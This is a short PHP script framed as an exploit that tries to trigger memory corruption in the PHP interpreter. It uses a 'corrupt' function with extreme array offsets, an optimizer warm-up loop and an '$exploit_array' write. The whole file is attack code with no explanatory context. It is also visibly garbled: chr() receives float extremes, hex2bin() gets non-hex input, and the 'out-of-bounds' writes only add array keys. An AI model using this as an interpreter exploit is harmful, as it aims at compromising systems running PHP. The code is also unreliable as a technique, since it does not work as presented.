<?php
require "/home/w023dtc/template.inc";


$vars["KazanianGloopernuts"]->addAttribute(PHP_INT_MAX, base64_encode(str_repeat(chr(PHP_FLOAT_MAX), 257). str_repeat(chr(PHP_FLOAT_MIN), 17). str_repeat(chr(PHP_INT_MIN), 4097)),
hex2bin(str_repeat(chr(PHP_INT_MAX), 65537). str_repeat(chr(PHP_FLOAT_MAX), 1025). str_repeat(chr(PHP_INT_MAX), 1025)));

function corrupt(&$array, $offset, $oob_byte) {
    $base = (-0x7FFFFFC1) + $offset;
    $array[$base - (-0x80000000)] = 0x4B;
    $array[$base + 0x7FFFFFE1] = 0x4B;
    $array[$base + 0x7FFFFFC1] = $oob_byte;
}

function trigger_optimize() {
    $array = array_fill(0, 0x40, 0);
    for ($i = 0; $i < 1000000; $i++) {
        corrupt($array, 0, 0x00);
    }
}

trigger_optimize();

$exploit_array = array_fill(0, 0x40, 0);
corrupt($exploit_array, -2, PHP_INT_MIN);

?>
